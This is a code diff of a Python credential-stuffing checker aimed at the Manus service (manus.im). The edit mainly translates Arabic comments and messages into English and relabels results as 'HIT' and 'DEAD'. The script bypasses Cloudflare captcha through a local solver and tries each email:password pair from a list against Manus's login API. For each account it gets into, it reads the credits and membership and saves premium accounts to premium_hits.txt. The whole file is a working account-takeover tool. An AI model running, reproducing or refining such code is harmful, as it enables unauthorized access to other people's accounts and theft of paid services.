@@ -1,23 +1,20 @@
 import requests
-import json
 import random
 import sys
 import time
 import os
 
 # ==========================================
-# ⚙️ الإعدادات الأساسية
+# ⚙️ Configuration
 # ==========================================
-# رابط سيرفر الكابتشا (إذا كان يعمل على نفس الجهاز)
 CAPTCHA_SOLVER_URL = "http://127.0.0.1:6767/solve?url=https%3A%2F%2Fmanus.im%2F&sitekey=0x4AAAAAAA_sd0eRNCinWBgU"
-
-# الملف الذي يحتوي على الإيميلات والباسوردات
 INPUT_FILE = "accounts.txt"
 
-# الألوان لطباعة النتائج
+# Colors
 GREEN = '\033[92m'
 RED = '\033[91m'
 YELLOW = '\033[93m'
+CYAN = '\033[96m'
 RESET = '\033[0m'
 
 def get_user_agent():
@@ -29,14 +26,13 @@ def get_user_agent():
 
 def solve_captcha():
     try:
-        # في حال كنت تستخدم 2Captcha أو غيره، تقوم بتعديل هذا الجزء
         response = requests.get(CAPTCHA_SOLVER_URL, timeout=90)
         if response.status_code == 200:
             data = response.json()
             if data.get("success") and "token" in data:
                 return data["token"]
         return None
-    except Exception as e:
+    except Exception:
         return None
 
 def check_account(email, password):
@@ -57,61 +53,58 @@ def check_account(email, password):
         "Origin": "https://manus.im"
     }
 
-    # 1. حل الكابتشا
-    print(f"[{email}] جاري حل الكابتشا...")
+    # 1. Captcha Bypass
     cf_token = solve_captcha()
     if not cf_token:
-        return {"status": "ERROR", "msg": "فشل حل الكابتشا (تأكد من تشغيل السيرفر)"}
+        return {"status": "ERROR", "msg": "Captcha Failed (No Solver)"}
 
     # 2. GetUserPlatforms
-    headers = headers_base.copy()
     url = "https://api.manus.im/user.v1.UserAuthPublicService/GetUserPlatforms"
     payload = {"email": email, "cfCaptchaCode": cf_token}
     
     try:
-        res = session.post(url, headers=headers, json=payload, timeout=30)
+        res = session.post(url, headers=headers_base, json=payload, timeout=30)
         if res.status_code != 200:
-            return {"status": "ERROR", "msg": f"فشل الاتصال الأول: {res.status_code}"}
+            return {"status": "ERROR", "msg": f"HTTP {res.status_code}"}
             
         data = res.json()
         temp_token = data.get("tempToken")
         if not temp_token:
-            return {"status": "BAD", "msg": "لم يتم العثور على tempToken (ربما الإيميل غير مسجل)"}
+            return {"status": "DEAD", "msg": "Invalid Email / No TempToken"}
 
     except Exception as e:
-        return {"status": "ERROR", "msg": f"خطأ بالشبكة: {str(e)}"}
+        return {"status": "ERROR", "msg": "Connection Failed"}
 
     # 3. LoginByEmail
     url_login = "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail"
     payload_login = {"email": email, "password": password, "token": temp_token}
     
     try:
-        res_login = session.post(url_login, headers=headers, json=payload_login, timeout=30)
+        res_login = session.post(url_login, headers=headers_base, json=payload_login, timeout=30)
         data_login = res_login.json()
         
         if "token" not in data_login:
-            return {"status": "BAD", "msg": "الباسورد خاطئ أو الحساب محظور"}
+            return {"status": "DEAD", "msg": "Invalid Password / Blocked"}
             
         auth_token = data_login["token"]
         
     except Exception as e:
-        return {"status": "ERROR", "msg": f"خطأ في تسجيل الدخول: {str(e)}"}
+        return {"status": "ERROR", "msg": "Login Failed"}
 
     # 4. GetAvailableCredits
     url_credits = "https://api.manus.im/user.v1.UserService/GetAvailableCredits"
-    headers_auth = headers.copy()
+    headers_auth = headers_base.copy()
     headers_auth["Authorization"] = f"Bearer {auth_token}"
     headers_auth["Priority"] = "u=4"
     
     try:
         res_credits = session.post(url_credits, headers=headers_auth, json={}, timeout=30)
-        credits_data = res_credits.json()
-        credits = credits_data.get("totalCredits", "Unknown")
-        
         if res_credits.status_code == 403:
-            return {"status": "BAN", "msg": "الحساب محظور (Blocked)"}
+            return {"status": "DEAD", "msg": "Banned / Blocked"}
+        credits_data = res_credits.json()
+        credits = credits_data.get("totalCredits", "0")
     except:
-        credits = "Unknown"
+        credits = "0"
 
     # 5. UserInfo
     url_info = "https://api.manus.im/user.v1.UserService/UserInfo"
@@ -124,24 +117,22 @@ def check_account(email, password):
     except:
         membership, user_type, task_limit = "Unknown", "Unknown", "Unknown"
 
-    # تحديد نوع الحساب
     result_str = f"Credits: {credits} | Mem: {membership} | Type: {user_type} | Limits: {task_limit}"
     
-    # تصنيف: هل الحساب مدفوع أم مجاني؟
     if "free" in str(membership).lower() or "free" in str(user_type).lower() or str(membership) == "0":
         return {"status": "FREE", "msg": result_str}
     else:
-        return {"status": "PREMIUM", "msg": result_str}
+        return {"status": "HIT", "msg": result_str}
 
 def main():
     if not os.path.exists(INPUT_FILE):
-        print(f"{RED}تنبيه: تأكد من وجود ملف باسم {INPUT_FILE} في نفس المجلد وبه الإيميلات والباسوردات (email:pass){RESET}")
+        print(f"{RED}[!] File {INPUT_FILE} not found!{RESET}")
         sys.exit()
 
     with open(INPUT_FILE, "r") as f:
         accounts = [line.strip() for line in f if ":" in line]
 
-    print(f"تم تحميل {len(accounts)} حساب. جاري البدء...\n")
+    print(f"[*] Loaded {len(accounts)} accounts. Starting...\n")
 
     for acc in accounts:
         parts = acc.split(":", 1)
@@ -149,18 +140,18 @@ def main():
         
         result = check_account(email, pwd)
         
-        if result["status"] == "PREMIUM":
+        if result["status"] == "HIT":
             print(f"{GREEN}[HIT - PREMIUM] {email}:{pwd} -> {result['msg']}{RESET}")
             with open("premium_hits.txt", "a") as out:
                 out.write(f"{email}:{pwd} | {result['msg']}\n")
         elif result["status"] == "FREE":
-            print(f"{YELLOW}[FREE] {email}:{pwd} -> {result['msg']}{RESET}")
-        elif result["status"] == "BAN":
-            print(f"{RED}[BANNED] {email}:{pwd} -> {result['msg']}{RESET}")
+            print(f"{YELLOW}[HIT - FREE] {email}:{pwd} -> {result['msg']}{RESET}")
+        elif result["status"] == "DEAD":
+            print(f"{RED}[DEAD] {email} -> {result['msg']}{RESET}")
         else:
-            print(f"[BAD/ERROR] {email} -> {result['msg']}")
+            print(f"{CYAN}[ERROR] {email} -> {result['msg']}{RESET}")
             
-        time.sleep(1) # تأخير بسيط بين الحسابات
+        time.sleep(1)
 
 if __name__ == "__main__":
     main()
